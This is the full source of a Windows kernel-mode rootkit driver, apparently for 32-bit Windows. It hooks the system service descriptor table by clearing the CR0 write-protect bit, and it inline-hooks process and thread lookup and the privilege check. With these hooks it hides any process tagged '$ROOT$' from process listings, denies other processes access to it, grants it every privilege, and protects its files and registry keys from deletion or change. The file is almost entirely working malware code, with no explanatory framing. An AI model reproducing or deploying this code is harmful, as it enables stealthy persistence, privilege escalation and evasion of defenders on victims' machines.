#include <ntifs.h>
#include <ntddk.h>
#include "kernelhook.h"
 
extern "C" LPSTR PsGetProcessImageFileName(PEPROCESS);
 
typedef NTSTATUS (*pPsLookupProcessByProcessId)(HANDLE,PEPROCESS*);
typedef NTSTATUS (*pPsLookupThreadByThreadId)(HANDLE,PETHREAD*);
typedef BOOLEAN (*pSeSinglePrivilegeCheck)(LUID,KPROCESSOR_MODE);
typedef NTSTATUS (*pNtQuerySystemInformation)(ULONG,PVOID,ULONG,PULONG);
typedef NTSTATUS (*pNtSetInformationFile)(HANDLE,PIO_STATUS_BLOCK,PVOID,ULONG,FILE_INFORMATION_CLASS);
typedef NTSTATUS (*pNtDeleteValueKey)(HANDLE,PUNICODE_STRING);
typedef NTSTATUS (*pNtDeleteKey)(HANDLE);
typedef NTSTATUS (*pNtSetValueKey)(HANDLE,PUNICODE_STRING,ULONG,ULONG,PVOID,ULONG);
 
extern "C" NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG,PVOID,ULONG,PULONG);
 
typedef struct _KSERVICE_DESCRIPTOR_TABLE
{
    PULONG ServiceTableBase; 
    PULONG ServiceCounterTableBase; 
    ULONG NumberOfServices; 
    PUCHAR ParamTableBase; 
}KSERVICE_DESCRIPTOR_TABLE,*PKSERVICE_DESCRIPTOR_TABLE;
 
typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;
 
extern "C" PKSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable;
 
pPsLookupProcessByProcessId fnPsLookupProcessByProcessId;
pPsLookupThreadByThreadId fnPsLookupThreadByThreadId;
pSeSinglePrivilegeCheck fnSeSinglePrivilegeCheck;
pNtQuerySystemInformation fnNtQuerySystemInformation;
pNtSetInformationFile fnNtSetInformationFile;
pNtDeleteValueKey fnNtDeleteValueKey;
pNtDeleteKey fnNtDeleteKey;
pNtSetValueKey fnNtSetValueKey;
 
KERNEL_HOOK PLPHook,PLTHook,SSPCHook;
 
PVOID Hook(ULONG ServiceNumber,PVOID Hook)
{
    PVOID OrigAddress;
 
    OrigAddress=(PVOID)KeServiceDescriptorTable->ServiceTableBase[ServiceNumber];
 
    __asm
    {
        cli
        mov eax,cr0
        and eax,not 0x10000
        mov cr0,eax
    }
 
    KeServiceDescriptorTable->ServiceTableBase[ServiceNumber]=(ULONG)Hook;
 
    __asm
    {
        mov eax,cr0
        or eax,0x10000
        mov cr0,eax
        sti
    }
 
    return OrigAddress;
}
 
BOOLEAN IsRootProcess()
{
    if(strstr(PsGetProcessImageFileName(PsGetCurrentProcess()),"$ROOT$"))
    {
        return TRUE;
    }
 
    return FALSE;
}
 
BOOLEAN IsCsrssProcess()
{
    if(!strcmp(PsGetProcessImageFileName(PsGetCurrentProcess()),"csrss.exe"))
    {
        return TRUE;
    }
 
    return FALSE;
}
 
NTSTATUS HookPsLookupProcessByProcessId(HANDLE ProcessId,PEPROCESS* ep)
{
    NTSTATUS ret;
 
    ret=fnPsLookupProcessByProcessId(ProcessId,ep); // Call the original function
 
    if(IsRootProcess())
    {
        return ret;
    }
 
    if(IsCsrssProcess())
    {
        return ret;
    }
 
    if(NT_SUCCESS(ret))
    {
        if(strstr(PsGetProcessImageFileName(*ep),"$ROOT$")) // Get the process name
        {
            // If this is root process, deny the access
 
            ObDereferenceObject(*ep);
 
            *ep=NULL; // Set the object pointer to NULL
            return STATUS_ACCESS_DENIED; // Return error to caller
        }
    }
 
    return ret;
}
 
NTSTATUS HookPsLookupThreadByThreadId(HANDLE ThreadId,PETHREAD* et)
{
    NTSTATUS ret;
 
    ret=fnPsLookupThreadByThreadId(ThreadId,et); // Call the original function
 
    if(IsRootProcess())
    {
        return ret;
    }
 
    if(IsCsrssProcess())
    {
        return ret;
    }
 
    if(NT_SUCCESS(ret))
    {
        if(strstr(PsGetProcessImageFileName(PsGetThreadProcess(*et)),"$ROOT$")) // Get the owner process name
        {
            // If the thread is belongs to the root process, deny the access.
             
            ObDereferenceObject(*et); // Dereference the thread object
 
            *et=NULL; // Set the object pointer to NULL
            return STATUS_ACCESS_DENIED; // Return error to caller
        }
    }
 
    return ret;
}
 
BOOLEAN HookSeSinglePrivilegeCheck(LUID PrivilegeValue,KPROCESSOR_MODE PreviousMode)
{
    if(IsRootProcess())
    {
        return TRUE; // This allows the root process to bypass privilege checks
    }
 
    return fnSeSinglePrivilegeCheck(PrivilegeValue,PreviousMode);
}
 
NTSTATUS HookNtQuerySystemInformation(ULONG InfoClass,PVOID Buffer,ULONG Length,PULONG ReturnLength)
{
    PSYSTEM_PROCESS_INFO pCurr,pNext;
    NTSTATUS ret;
 
    if(InfoClass!=5)
    {
        return fnNtQuerySystemInformation(InfoClass,Buffer,Length,ReturnLength);
    }
 
    ret=fnNtQuerySystemInformation(InfoClass,Buffer,Length,ReturnLength);
 
    if(IsRootProcess())
    {
        return ret;
    }
 
    if(NT_SUCCESS(ret))
    {
        pCurr=NULL;
        pNext=(PSYSTEM_PROCESS_INFO)Buffer;
 
        while(pNext->NextEntryOffset!=0)
        {
            pCurr=pNext;
            pNext=(PSYSTEM_PROCESS_INFO)((PUCHAR)pCurr+pCurr->NextEntryOffset);
 
            if(wcsstr(pNext->ImageName.Buffer,L"$ROOT$"))
            {
                if(pNext->NextEntryOffset==0)
                {
                    pCurr->NextEntryOffset=0;
                }
 
                else
                {
                    pCurr->NextEntryOffset+=pNext->NextEntryOffset;
                }
 
                pNext=pCurr;
            }
        }
    }
 
    return ret;
}
 
NTSTATUS HookNtSetInformationFile(HANDLE hFile,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInfo,ULONG Length,FILE_INFORMATION_CLASS InfoClass)
{
    char buffer[1024];
    IO_STATUS_BLOCK ibs;
 
    PFILE_NAME_INFORMATION FileNameInfo;
 
    FileNameInfo=(PFILE_NAME_INFORMATION)&buffer;
 
    if(IsRootProcess())
    {
        return fnNtSetInformationFile(hFile,IoStatusBlock,FileInfo,Length,InfoClass);
    }
 
    if(InfoClass==FileDispositionInformation)
    {
        if(NT_SUCCESS(ZwQueryInformationFile(hFile,&ibs,FileNameInfo,1024,FileNameInformation))) // Get the file name
        {
            if(wcsstr(FileNameInfo->FileName,L"$ROOT$")) // Check the file name
            {
                return STATUS_ACCESS_DENIED; // If this is protected file, deny the access.
            }
        }
    }
 
    return fnNtSetInformationFile(hFile,IoStatusBlock,FileInfo,Length,InfoClass); // Call the original function
}
 
NTSTATUS HookNtDeleteValueKey(HANDLE hKey,PUNICODE_STRING ValueName)
{
    char buffer[1024];
    ULONG ReturnLength;
    PKEY_NAME_INFORMATION KeyNameInfo;
 
    KeyNameInfo=(PKEY_NAME_INFORMATION)&buffer;
 
    if(IsRootProcess())
    {
        return fnNtDeleteValueKey(hKey,ValueName);
    }
 
    if(NT_SUCCESS(ZwQueryKey(hKey,KeyNameInformation,KeyNameInfo,1024,&ReturnLength))) // Get the key name
    {
        if(wcsstr(KeyNameInfo->Name,L"$ROOT$")) // If the value is inside the protected key, deny the access.
        {
            return STATUS_ACCESS_DENIED; // Return error to caller
        }
    }
     
    if(wcsstr(ValueName->Buffer,L"$ROOT$")) // If this is protected value, deny the access.
    {
        return STATUS_ACCESS_DENIED;
    }
 
    return fnNtDeleteValueKey(hKey,ValueName); // Call the original function
}
 
NTSTATUS HookNtDeleteKey(HANDLE hKey)
{
    char buffer[1024];
    ULONG ReturnLength;
    PKEY_NAME_INFORMATION KeyNameInfo;
 
    KeyNameInfo=(PKEY_NAME_INFORMATION)&buffer;
 
    if(IsRootProcess())
    {
        return fnNtDeleteKey(hKey);
    }
 
    if(NT_SUCCESS(ZwQueryKey(hKey,KeyNameInformation,KeyNameInfo,1024,&ReturnLength))) // Get the key name
    {
        if(wcsstr(KeyNameInfo->Name,L"$ROOT$")) // If this is protected key, deny the access.
        {
            return STATUS_ACCESS_DENIED; // Return error to caller
        }
    }
 
    return fnNtDeleteKey(hKey); // Call the original function
}
 
NTSTATUS HookNtSetValueKey(HANDLE hKey,PUNICODE_STRING ValueName,ULONG TitleIndex,ULONG Type,PVOID Data,ULONG Size)
{
    char buffer[1024];
    ULONG ReturnLength;
    PKEY_NAME_INFORMATION KeyNameInfo;
 
    KeyNameInfo=(PKEY_NAME_INFORMATION)&buffer;
 
    if(IsRootProcess())
    {
        return fnNtSetValueKey(hKey,ValueName,TitleIndex,Type,Data,Size);
    }
 
    if(NT_SUCCESS(ZwQueryKey(hKey,KeyNameInformation,KeyNameInfo,1024,&ReturnLength))) // Get the key name
    {
        if(wcsstr(KeyNameInfo->Name,L"$ROOT$")) // If the value is inside the protected key, deny the access.
        {
            return STATUS_ACCESS_DENIED; // Return error to caller
        }
    }
 
    return fnNtSetValueKey(hKey,ValueName,TitleIndex,Type,Data,Size); // Call the original function
}
 
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath)
{
    // Set inline hooks
     
    KhInitHook(&PLPHook,PsLookupProcessByProcessId,HookPsLookupProcessByProcessId);
    KhInitHook(&PLTHook,PsLookupThreadByThreadId,HookPsLookupThreadByThreadId);
    KhInitHook(&SSPCHook,SeSinglePrivilegeCheck,HookSeSinglePrivilegeCheck);
 
    fnPsLookupProcessByProcessId=(pPsLookupProcessByProcessId)PLPHook.OrigFunction;
    fnPsLookupThreadByThreadId=(pPsLookupThreadByThreadId)PLTHook.OrigFunction;
    fnSeSinglePrivilegeCheck=(pSeSinglePrivilegeCheck)SSPCHook.OrigFunction;
 
    KhStartHook(&PLPHook);
    KhStartHook(&PLTHook);
    KhStartHook(&SSPCHook);
 
    // Set SSDT hooks
 
    fnNtQuerySystemInformation=(pNtQuerySystemInformation)Hook(*(PULONG)((PUCHAR)ZwQuerySystemInformation+1),HookNtQuerySystemInformation);
    fnNtSetInformationFile=(pNtSetInformationFile)Hook(*(PULONG)((PUCHAR)ZwSetInformationFile+1),HookNtSetInformationFile);
    fnNtDeleteValueKey=(pNtDeleteValueKey)Hook(*(PULONG)((PUCHAR)ZwDeleteValueKey+1),HookNtDeleteValueKey);
    fnNtDeleteKey=(pNtDeleteKey)Hook(*(PULONG)((PUCHAR)ZwDeleteKey+1),HookNtDeleteKey);
    fnNtSetValueKey=(pNtSetValueKey)Hook(*(PULONG)((PUCHAR)ZwSetValueKey+1),HookNtSetValueKey);
 
    return STATUS_SUCCESS;
}